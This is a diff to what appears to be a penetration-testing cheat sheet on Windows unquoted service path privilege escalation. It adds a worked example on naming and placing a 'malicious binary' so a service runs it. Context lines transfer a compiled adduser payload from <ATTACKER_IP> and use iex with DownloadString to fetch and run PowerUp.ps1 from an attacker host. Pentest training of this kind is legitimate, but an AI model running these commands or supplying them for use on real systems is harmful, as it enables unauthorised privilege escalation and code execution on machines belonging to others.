@@ -56,6 +56,15 @@ x86_64-w64-mingw32-gcc adduser.c -o <SERVICE>.exe
 #Transfer file
 iwr -uri http://<ATTACKER_IP>/<SERVICE>.exe -Outfile <PATHFILE>.exe 
 
+NOTE: as the vulnerable unquoted path checks gradually the path using the rest of ir as arguments, You should use a binary name that is part of the path you can write to. 
+# For example: 
+## VULNERABLE PATH: C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
+## WRITEABLE PATH BY YOUR USER: C:\Enterprise Software\Monitoring Solution\
+## You need to name your malicious binary as --> Surveillance.exe, place it in C:\Enterprise Software\Monitoring Solution\ and then Restart-Service because the way that Windows performs the binary search is:
+## 1.- C:\Enterprise.exe
+## 2.- C:\Enterprise Software\Monitoring.exe
+## 3.- C:\Enterprise Software\Monitoring Solution\Surveillance.exe --> When Windows find Surveillance.exe in this search, it will execute our malicious binary instead of the legit one ReynhSurveillance.exe.
+
 #PowerUp's Invoke-Allchecks cmdlet displays Unquoted Path services.
 iex (New-Object Net.WebClient).DownloadString('http://IP_ATTACKER/PowerUp.ps1')
 Invoke-AllChecks
